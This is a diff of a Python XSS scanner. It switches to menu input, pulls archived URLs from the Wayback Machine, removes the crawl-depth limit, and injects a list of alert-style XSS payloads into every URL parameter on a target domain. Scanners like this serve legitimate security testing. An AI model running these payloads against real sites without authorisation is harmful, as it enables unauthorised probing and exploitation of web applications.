@@ -1,11 +1,11 @@
-import argparse
+import subprocess
 import requests
 from urllib.parse import urljoin, urlparse, urlencode, parse_qsl
 from bs4 import BeautifulSoup
 import tldextract
 import json
-from concurrent.futures import ThreadPoolExecutor
 import time
+from concurrent.futures import ThreadPoolExecutor
 
 # 🎯 Default XSS Payloads
 DEFAULT_PAYLOADS = [
@@ -15,12 +15,14 @@ DEFAULT_PAYLOADS = [
     "<svg/onload=alert('XSS')>",
     "%3Cscript%3Ealert%28'XSS'%29%3C%2Fscript%3E",
     "';alert('XSS');//",
-    "javascript:alert('XSS')",  # JavaScript URI scheme
-    "' onfocus='alert(\"XSS\")' autofocus='true",  # Form-based
+    "javascript:alert('XSS')",
+    "' onfocus='alert(\"XSS\")' autofocus='true",
 ]
 
 visited_urls = set()
 output_results = []
+DELAY = 1.0
+OUTPUT_FILE = "result.json"
 
 def is_subdomain(url, domain):
     """Check if a URL belongs to the same domain or its subdomains."""
@@ -44,6 +46,26 @@ def find_urls(url, domain):
     except Exception as e:
         print(f"❌ Error crawling {url}: {e}")
     return urls
+
+def fetch_wayback_urls(domain):
+    """Fetch URLs for a domain from Wayback Machine using WaybackURLs."""
+    try:
+        print(f"[+] Fetching URLs for domain: {domain} from Wayback Machine...")
+        result = subprocess.run(
+            ["waybackurls", domain],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+        )
+        if result.returncode != 0:
+            print(f"[-] Error fetching URLs: {result.stderr.strip()}")
+            return []
+        urls = result.stdout.splitlines()
+        print(f"[+] Retrieved {len(urls)} URLs from Wayback Machine.")
+        return urls
+    except FileNotFoundError:
+        print("[-] WaybackURLs not found. Install it using: go install github.com/tomnomnom/waybackurls@latest")
+        return []
 
 def test_xss(url, payloads):
     """Test XSS payloads on all parameters of a URL."""
@@ -76,14 +98,18 @@ def test_xss(url, payloads):
         print(f"❌ Error testing {url}: {e}")
     return False
 
-def crawl_and_test(domain, output_file, depth, delay, payloads):
+def crawl_and_test(domain, payloads):
     """Crawl a domain and test for XSS vulnerabilities."""
     print(f"🚀 Starting scan on: {domain}")
     urls_to_test = [domain]
-    current_depth = 0
 
+    # Fetch archived URLs from Wayback Machine
+    wayback_urls = fetch_wayback_urls(domain)
+    urls_to_test.extend(wayback_urls)
+
+    current_depth = 0
     with ThreadPoolExecutor(max_workers=10) as executor:
-        while urls_to_test and current_depth < depth:
+        while urls_to_test:
             current_urls = urls_to_test[:10]
             urls_to_test = urls_to_test[10:]
 
@@ -95,47 +121,46 @@ def crawl_and_test(domain, output_file, depth, delay, payloads):
             for future in test_futures:
                 future.result()
 
-            current_depth += 1
-            time.sleep(delay)
+            time.sleep(DELAY)
 
-    with open(output_file, 'w') as f:
+    with open(OUTPUT_FILE, 'w') as f:
         json.dump(output_results, f, indent=4)
-    print(f"\n📁 Results saved to: {output_file}")
+    print(f"\n📁 Results saved to: {OUTPUT_FILE}")
 
-def load_payloads(payloads_file):
-    """Load custom payloads from a file."""
-    try:
-        with open(payloads_file, 'r') as f:
-            return [line.strip() for line in f if line.strip()]
-    except Exception as e:
-        print(f"❌ Error loading payloads: {e}")
-        return DEFAULT_PAYLOADS
+def menu():
+    """Menu-based input system."""
+    global DELAY, OUTPUT_FILE
+
+    print("🔍 Welcome to the XSS Scanner")
+    domain = input("1. Enter the target domain (e.g., https://example.com): ").strip()
+
+    print("\n2. Choose Payloads:")
+    print("   1. Use Default Payloads")
+    print("   2. Load from File")
+    choice = input("   Enter choice (1 or 2): ").strip()
+
+    if choice == "2":
+        payload_file = input("   Enter path to payload file: ").strip()
+        try:
+            with open(payload_file, 'r') as f:
+                payloads = [line.strip() for line in f if line.strip()]
+            print(f"✅ Loaded {len(payloads)} payloads from {payload_file}")
+        except Exception as e:
+            print(f"❌ Error loading payload file: {e}")
+            payloads = DEFAULT_PAYLOADS
+    else:
+        payloads = DEFAULT_PAYLOADS
+        print("✅ Using default payloads.")
+
+    OUTPUT_FILE = input("\n3. Enter output file name (default: result.json): ").strip() or "result.json"
+    DELAY = float(input("\n4. Enter delay between requests (default: 1.0 seconds): ").strip() or "1.0")
+
+    print("\n🚀 Starting XSS Scanner...")
+    crawl_and_test(domain, payloads)
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(
-        description="🔍 Professional XSS Parameter Finder"
-    )
-    parser.add_argument(
-        "domain", help="Target domain (e.g., https://example.com)"
-    )
-    parser.add_argument(
-        "-o", "--output", default="xss_results.json", help="Output file name (default: xss_results.json)"
-    )
-    parser.add_argument(
-        "-d", "--depth", type=int, default=3, help="Maximum crawl depth (default: 3)"
-    )
-    parser.add_argument(
-        "--delay", type=float, default=1, help="Delay between requests in seconds (default: 1)"
-    )
-    parser.add_argument(
-        "--payloads", help="File containing custom payloads (optional)"
-    )
-
-    args = parser.parse_args()
-    payloads = load_payloads(args.payloads) if args.payloads else DEFAULT_PAYLOADS
-
     try:
-        crawl_and_test(args.domain, args.output, args.depth, args.delay, payloads)
+        menu()
     except KeyboardInterrupt:
         print("\n❌ Interrupted by user.")
     except Exception as e:
